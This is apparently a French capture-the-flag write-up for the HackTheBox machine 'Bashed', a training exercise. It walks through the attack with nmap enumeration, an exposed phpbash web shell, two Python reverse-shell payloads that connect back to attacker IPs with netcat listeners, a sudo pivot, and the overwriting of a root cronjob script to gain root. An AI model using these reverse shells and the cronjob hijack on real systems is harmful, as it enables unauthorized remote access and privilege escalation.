# Bashed [Linux] Easy

# —1. Enumeration —

## Nmap

`nmap -sS -sV -A 10.10.10.68`

On trouve que un serveur web sur le port 80

Le site est un blog le mec parle de son projet Github qui est un terminal Linux sur web qui s’appelle phpbash.php

## Dirbuster

On trouve le script dans : /dev/phpbash.php

![Untitled](Bashed%20%5BLinux%5D%20Easy%20c118f6f39e9a4c44ad88ada3ff759687/Untitled.png)

On peux aller dans `/home/arrexel` et obtenir le premier flag.

# — 2. Exploit Vulnerabilities —

Nous avons un shell ou nous avons des accès utilisateurs j’ai donc pris un shell sur [payloadallthing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) : 

```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

`nc -lvnp 4242`

Shell !

# — 3. Privilege Escalation —

```python
$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Avec sudo -l on trouve un permission pour la commande scriptmanager

On peux passer de l’utilisateur arrexel à scriptmanager avec cette commande :

`sudo -u scriptmanager bash -i`

On est maintenant script manager et on peux accéder à de nouveau dossier comme /script à la racine.

Dans /script on peux essayer d’avoir des info des fichier avec `ls -al` et on peux voir que le test.txt à été changé il y a une minutes en regardant le [test.py](http://test.py) on vois qu’il change le test.txt il faut deviner qu’il y a un cronjob qui exécute toutes les minutes le test.py on va donc le change pour ce script et le télécharger depuis la machine avec la commande `wget [LHOST:LPORT]/test.py`

Le script :

```python
import socket
import os
import pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.16",4241))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")'
```

On met un listener avec `nc -lvnp 4241` et dans 1 minutes max on obtient une connexion root puisque le cronjob été exécuter en tant que root! Si ça ne marche pas essayer de mettre `chmod +x`